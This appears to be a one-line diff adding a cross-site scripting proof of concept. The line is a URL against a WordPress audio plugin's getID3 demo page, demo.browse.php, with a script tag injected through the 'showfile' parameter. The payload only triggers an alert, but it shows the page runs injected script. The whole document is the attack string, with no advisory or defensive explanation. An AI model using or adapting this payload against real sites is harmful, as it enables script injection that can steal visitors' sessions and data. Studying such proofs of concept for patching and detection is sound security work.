@@ -1,0 +1,1 @@
+http://www.example.com/wordpress/wp-content/plugins/audio/getid3/demos/demo.browse.php?showfile=%3Cscript%3Ealert(0)%3C/script%3E
